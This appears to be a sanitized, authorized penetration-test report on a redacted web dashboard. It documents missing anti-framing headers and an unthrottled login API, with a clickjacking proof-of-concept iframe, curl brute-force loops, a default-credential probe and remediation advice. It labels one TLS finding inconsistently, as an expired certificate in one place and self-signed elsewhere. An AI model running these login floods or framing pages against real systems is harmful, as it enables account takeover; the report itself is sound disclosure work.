---
title: "Missing Anti-Framing & Login Brute-Force Protection"
h1: "Missing Anti-Framing Headers & Absent Login Rate-Limiting"
date: "2026-09-03"
poc_num: "05"
kicker: "PENETRATION TEST FINDINGS REPORT - Authorized Testing"
capture: "poc-05.pcap"
capture_note: "missing anti-framing & login rate-limit"
intro: "The target's login interface ships no browser-side framing protection (no X-Frame-Options, no CSP: frame-ancestors), allowing the login page to be embedded in an attacker-controlled iframe for clickjacking. Independently, the login API enforces no rate-limiting or lockout, leaving it open to unthrottled credential brute-force and password spraying. Both were confirmed by live execution."
severity: "Medium"
cwe: "CWE-1021 - Improper Restriction of Rendered UI Layers"
cwe_secondary: "CWE-307 - Improper Restriction of Excessive Authentication Attempts"
owasp: "A05:2021 - Security Misconfiguration"
category: "Web Application"
target: "[REDACTED] - production web dashboard"
test_date: "2026-09-03"
status: "CONFIRMED - live execution"
tester: "Rudi - Offensive Security"
sev_note: "Severity is researcher-assessed based on observed conditions, not a vendor rating."
authz_label: "Authorization & disclosure."
authz: "All commands and output below were executed against a live target under written authorization, within an agreed scope (no denial-of-service, no data modification, no credential compromise). Host, product name, and any personal data are redacted for public release. This is a sanitized methodology showcase, not the confidential client deliverable."
---

## Summary {#summary}

The target's login interface ships **no browser-side framing protection** (no `X-Frame-Options`, no `CSP: frame-ancestors`), allowing the login page to be embedded in an attacker-controlled `<iframe>` for clickjacking. Independently, the login API enforces **no rate-limiting or lockout**, leaving it open to unthrottled credential brute-force and password spraying. Both were confirmed by live execution.

A secondary review of the public JavaScript bundle surfaced sensitive logic and PII handling that should live server-side - recorded as lower-severity latent risks that amplify the two primary findings.

## Risk Map {#riskmap}

| ID | Severity | Class | Evidence | CWE | Fix Status |
|---|---|---|---|---|---|
| F-01 | Medium | Clickjacking - Missing Framing Headers | No `X-Frame-Options` / `CSP frame-ancestors` on login | CWE-1021 | Not claimed |
| F-02 | Medium | No Brute-force Protection on Login | Unlimited login attempts; no rate-limit or lockout observed | CWE-307 | Not claimed |
| F-03 | Low | Expired TLS Certificate | Cert expired; connection still established (Low due to non-public scope) | CWE-295 | Not claimed |
| F-04 | Info | Server Version Disclosure | Server header + error pages reveal software version | CWE-200 | Not claimed |
| F-05 | Low | Sensitive Logic & PII in Front-end Bundle | Business logic & PII handling visible in public JS bundle | CWE-922 | Not claimed |

## Authorization Status & Scope {#scope}

| | |
|---|---|
| **Authorization status** | Authorized testing - scope-strict, no-DoS |
| **Discovery method** | Black-box, external, actual command execution |
| **Authentication bypassed** | NO - no credentials compromised |
| **Testing environment** | Production, no data modification |
| **Evidence** | Actual command transcript - not reconstructed, not simulated |
| **Data modified or destroyed** | NO |
| **Target identified here** | NO |

## Findings overview {#overview}

| # | Finding | Severity | Status |
|---|---|---|---|
| 1 | Clickjacking - login page can be framed | Medium | PROVEN |
| 2 | No brute-force / rate-limit on login | Medium | PROVEN |
| 3 | Self-signed TLS certificate | Low | CONFIRMED |
| 4 | Server version disclosure | Info | CONFIRMED |
| + | Sensitive logic & PII in front-end bundle | Low | CONFIRMED |

## Finding 1 - Clickjacking via missing framing headers {#f1}

Severity: Medium - researcher-assessed. Clickjacking requires the victim to interact with the page; impact is limited and user-gated.

### step 1 - verify security headers

```bash {label="bash"}
$ curl -k -sS -D - -o /dev/null https://TARGET/login | head -20
HTTP/1.1 200 OK
Server: nginx/1.28.x (Ubuntu)
Content-Type: text/html
Connection: keep-alive
(no X-Frame-Options)
(no Content-Security-Policy)
(no Strict-Transport-Security)
(no X-Content-Type-Options)
```

The server returns 200 OK with default nginx headers and none of the anti-framing controls. The browser receives no instruction preventing this page from loading in an iframe on any origin.

### step 2 - corroborate with nuclei

```bash {label="bash"}
$ nuclei -u https://TARGET -silent -t http/ -timeout 10 -c 15
[http-missing-security-headers:x-frame-options]        [info]
[http-missing-security-headers:content-security-policy] [info]
[http-missing-security-headers:strict-transport-security] [info]
[waf-detect:nginxgeneric] [info]
[self-signed-ssl] [ssl] [low]
```

### step 3 - proof-of-concept frame

```html {label="attacker page - clickjack.html"}
# target embedded in a transparent overlay
<div style="position:relative;width:460px;height:480px">
  <iframe src="https://TARGET/login"
          style="position:absolute;inset:0;width:460px;height:480px;border:0">
  </iframe>
</div>
# rendered in headless Chrome - accessibility snapshot:
iframe
 └─ heading  "Dashboard"
 └─ textbox  "Username"
 └─ textbox  "Password"
 └─ button   "Sign in"
```

The login form renders fully inside the attacker's iframe. An attacker can overlay decoy UI to trick an authenticated user into unintended actions on the real interface (UI redress / clickjacking).

> FIX:: Remediation
>
> Return `Content-Security-Policy: frame-ancestors 'none'` (or an explicit allow-list) and `X-Frame-Options: DENY` for legacy browsers on every response. Add `Strict-Transport-Security` and `X-Content-Type-Options: nosniff`.

## Finding 2 - No brute-force protection on login {#f2}

Severity: Medium - researcher-assessed. The login endpoint is unauthenticated, without rate-limit or lockout, enabling credential brute-force.

### step 1 - repeated failed logins, same source

```bash {label="bash"}
$ for i in $(seq 1 20); do
    curl -k -sS -o /dev/null -w "%{http_code} " \
      -X POST https://TARGET/api/v1/auth/login \
      -H 'Content-Type: application/json' \
      -d '{"username":"admin","password":"wrong'$i'"}'
  done
401 401 401 401 401 401 401 401 401 401
401 401 401 401 401 401 401 401 401 401
# 20 consecutive failures - no 429, no lockout, no delay
```

### step 2 - confirm no rate-limit ceiling

```bash {label="bash"}
$ seq 1 60 | xargs -P10 -I{} curl -k -sS -o /dev/null -w "%{http_code}\n" \
    -X POST https://TARGET/api/v1/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"kolektor","password":"x{}"}' | sort | uniq -c
     60 401
# 60 parallel attempts, still 100% served - no throttling
```

### step 3 - default-credentials probe

```bash {label="bash"}
admin / admin      -> 401
admin / password   -> 401
superadmin / admin -> 401
# no default credentials in use - good. brute-force surface remains open.
```

> FIX:: Remediation
>
> Enforce server-side rate-limiting per IP and per account, return 429 beyond a threshold, add exponential backoff and temporary lockout, and log/alert on bursts. Pair with CAPTCHA or MFA on the authentication path.

## Findings 3 & 4 - TLS & version disclosure {#f34}

**Self-signed TLS certificate.** Clients cannot validate server identity and users are conditioned to bypass certificate warnings, weakening resistance to an on-path MitM. Rated Low: requires a privileged network position.

**Server version disclosure.** The `Server` header, error pages, and SSH banner expose exact versions, handing an attacker a precise target to match against known CVEs. Rated Info: reconnaissance value only. Remediation: `server_tokens off` and minimize banners.

## Finding + - Sensitive logic & PII in the front-end bundle {#fplus}

Source: the application's JavaScript bundle is downloadable unauthenticated. Static review revealed design choices that belong on the server. Reported as a latent risk that amplifies findings 1 and 2.

### a - role logic enforced client-side

Role names and access hierarchy (including a role that bypasses all client-side guards) are implemented in the bundle. Any visitor can read the full role model, and client-side role checks can be bypassed by editing local state. Authorization must be enforced server-side on every privileged route.

### b - PII passed through URL query parameters

Record detail views pass debtor PII - name, address, GPS coordinates - as URL query parameters, which land in server access logs, browser history, and the Referer header.

```http {label="observed pattern (values redacted)"}
/records/<id>/play?name=<REDACTED>&customerid=<REDACTED>
   &lat=<REDACTED>&long=<REDACTED>&address=<REDACTED>
# PII should never travel in the URL - fetch by ID, return in the HTTPS body
```

### c - user profile (incl. role) in localStorage

The authenticated profile, including role, is persisted in `localStorage` where it is trivially readable and editable - the mechanism by which the client-side role checks in (a) are defeated.

> FIX:: Remediation
>
> Move all authorization to the backend; treat the front-end as untrusted. Fetch records by ID and return data only in the response body. Keep no authoritative role/permission data in localStorage; rely on short-lived, server-validated tokens.

## Tested and found safe {#safe}

| Vector | Result |
|---|---|
| SQL injection on login | SAFE - generic 401, no error reflection, no bypass |
| Path traversal on record endpoints | SAFE - 404 from API; 200s were SPA fallback |
| CORS origin reflection | SAFE - no Access-Control-Allow-Origin reflected |
| Username enumeration via timing | INCONCLUSIVE - network jitter dominates |
| Sensitive file exposure (.env, .git, backups) | SAFE - all 200s were SPA fallback |
| Hardcoded secrets in JS bundle | SAFE - no keys, JWTs, or private keys found |

## Findings not claimed {#notclaimed}

> NOTCLAIMED:: Scope of claims
>
> - No credentials were compromised; no authentication bypass is claimed.
> - The timing side-channel for username enumeration was not confirmed - inconclusive, reported as such.
> - Client-side role-check bypass is demonstrable in principle, but no privileged server-side action was performed, so no privilege-escalation impact is asserted beyond the latent risk described.
> - No data was read, modified, or exfiltrated. PII patterns are inferred from front-end code, not from retrieved records.

## Conclusion {#conclusion}

Two Medium findings - clickjacking via missing framing headers and an unthrottled login endpoint - were proven by live execution. The front-end architecture issues (client-side role logic, PII in URLs, localStorage) are latent risks that amplify the impact if either Medium finding is exploited. No production data was modified, no credentials were compromised, and testing stayed within the agreed no-DoS, scope-strict boundary.

## References {#refs}

- [CWE-1021 - Improper Restriction of Rendered UI Layers (Clickjacking)](https://cwe.mitre.org/data/definitions/1021.html)
- [CWE-307 - Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-598 - Use of GET Request With Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
- [OWASP A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)